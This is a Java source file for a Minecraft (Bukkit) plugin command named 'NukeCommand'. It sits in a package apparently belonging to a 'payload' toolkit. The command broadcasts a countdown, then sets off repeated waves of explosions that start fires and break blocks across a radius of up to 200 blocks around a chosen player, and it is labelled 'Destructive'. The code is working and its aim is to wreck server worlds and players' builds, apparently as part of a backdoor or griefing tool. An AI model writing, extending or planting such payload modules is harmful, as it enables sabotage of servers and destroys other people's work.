package dev.naruto.astrox.payload.commands;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class NukeCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        int radius = 50; // Default radius
        Player target = sender;

        // Parse radius
        if (args.length > 0) {
            try {
                radius = Integer.parseInt(args[0]);
                radius = Math.min(radius, 200); // Safety cap
            } catch (NumberFormatException e) {
                // Try parsing as player name
                Player p = Bukkit.getPlayer(args[0]);
                if (p != null) target = p;
            }
        }

        // Parse target player
        if (args.length > 1) {
            Player p = Bukkit.getPlayer(args[1]);
            if (p != null) target = p;
        }

        final Location loc = target.getLocation();
        final int finalRadius = radius;
        final String targetName = target.getName();

        // Warning countdown
        sender.sendMessage("§c§l⚠ NUCLEAR STRIKE INITIATED");
        sender.sendMessage("§7Target: §f" + targetName);
        sender.sendMessage("§7Radius: §f" + finalRadius + " blocks");
        sender.sendMessage("§7Impact in: §c5 seconds");

        // Broadcast to all players
        Bukkit.broadcastMessage("§8§l[§4§l!§8§l] §c§lINCOMING NUCLEAR STRIKE!");

        // Countdown with sound effects
        for (int i = 5; i > 0; i--) {
            final int count = i;
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                playWarningSound(loc, count);
                if (count <= 3) {
                    Bukkit.broadcastMessage("§c§l" + count + "...");
                }
            }, (5 - i) * 20L);
        }

        // Execute nuke after 5 seconds
        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            executeNuke(loc, finalRadius);
            Bukkit.broadcastMessage("§4§l☢ NUCLEAR DETONATION ☢");
        }, 100L);
    }

    private void executeNuke(Location center, int radius) {
        // Multiple explosion waves
        for (int wave = 0; wave < 5; wave++) {
            final int currentWave = wave;

            Bukkit.getScheduler().runTaskLater(
                    Bukkit.getPluginManager().getPlugins()[0],
                    () -> {
                        // Create explosion pattern
                        for (int i = 0; i < 10; i++) {
                            double angle = Math.random() * Math.PI * 2;
                            double distance = Math.random() * radius;

                            double x = center.getX() + Math.cos(angle) * distance;
                            double y = center.getY() + (Math.random() * 40 - 20);
                            double z = center.getZ() + Math.sin(angle) * distance;

                            Location explosionLoc = new Location(center.getWorld(), x, y, z);

                            // Create explosion
                            center.getWorld().createExplosion(
                                    explosionLoc,
                                    radius / 5f,
                                    true,  // setFire
                                    true   // breakBlocks
                            );

                            // Visual effects
                            center.getWorld().strikeLightningEffect(explosionLoc);
                        }

                        // Sound effect
                        center.getWorld().playSound(center, Sound.ENTITY_GENERIC_EXPLODE, 10.0f, 0.5f);
                    },
                    currentWave * 10L
            );
        }
    }

    private void playWarningSound(Location loc, int countdown) {
        if (countdown <= 3) {
            loc.getWorld().playSound(loc, Sound.BLOCK_NOTE_BLOCK_PLING, 10.0f, 2.0f);
        }
    }

    @Override
    public String getDescription() {
        return "Launch nuclear strike";
    }

    @Override
    public String getUsage() {
        return "[radius] [player]";
    }

    @Override
    public String getCategory() {
        return "Destructive";
    }
}
